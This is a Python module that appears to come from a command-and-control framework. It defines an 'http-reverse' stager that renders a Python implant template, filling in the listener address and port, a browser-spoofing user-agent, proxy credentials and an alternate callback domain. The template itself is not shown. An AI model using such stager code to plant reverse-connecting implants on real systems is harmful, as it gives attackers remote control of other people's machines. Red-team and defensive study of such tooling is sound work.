import os
from typing import TYPE_CHECKING

import jinja2
from Utils.options import (AddressType, ChoiceType, DefaultStagerPool,
                           IntegerType, Option, OptionPool, StringType)

from ..base_stager import BasePayload, BaseStager

if TYPE_CHECKING:
    from Database import StagerModel


class PythonPayload(BasePayload):
    supported_target_os = ["linux", "windows", "osx"]
    supported_target_arch = ["x64", "x86"]
    supported_server_os = ["linux", "windows"]
    compiled = False
    options = OptionPool()

    @staticmethod
    def generate_payload(stager_db: "StagerModel") -> tuple[bytes | str, bool]:
        jinja2_env = jinja2.Environment(
            loader=jinja2.FileSystemLoader(
                os.path.dirname(os.path.abspath(__file__))),
            trim_blocks=True,
            lstrip_blocks=True,
            autoescape=False
        )
        template = jinja2_env.get_template("stager.py.jinja2")
        return template.render(
            host=stager_db.listener.address,
            port=stager_db.listener.port,
            user_agent=stager_db.options["user-agent"],
            proxy_address=stager_db.options["proxy_address"],
            proxy_port=stager_db.options["proxy_port"],
            proxy_auth=stager_db.options["proxy_auth"],
            different_address=stager_db.options["different-address"]
        ), False


class Stager(BaseStager):
    name = "http-reverse"
    description = "Reverse HTTP(S) stager"
    options = DefaultStagerPool([
        Option(
            name="Type",
            description="The type of payload to generate",
            type=ChoiceType([x.split(".")[0] for x in os.listdir(
                "Kits/http-reverse/payloads/")]),
            default="python",
            required=True
        ),
        Option(
            name="Request User-Agent",
            _real_name="user-agent",
            description="The User-Agent to use.",
            type=StringType,
            default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
        ),
        Option(
            name="Proxy address",
            _real_name="proxy_address",
            description="The address of a proxy to use.",
            type=AddressType,
        ),
        Option(
            name="Proxy port",
            _real_name="proxy_port",
            description="The port of a proxy to use.",
            type=IntegerType,
            default=8080
        ),
        Option(
            name="Proxy authentication",
            _real_name="proxy_auth",
            description="The Authentication to use (format=username:password).",
            type=StringType,
            default=""
        ),
        Option(
            name="Different address/domain",
            _real_name="different-address",
            description="Use a different address/domain then specified by the listener to connect to.",
            type=AddressType,
            required=False
        )
    ])
    payloads = {
        "python": PythonPayload
    }

    def generate_stager(self, stager_db: "StagerModel") -> tuple[bytes | str, bool]:
        if stager_db.payload_type not in self.payloads:
            raise ValueError("Invalid payload type")

        return self.payloads[stager_db.payload_type].generate_payload(stager_db)
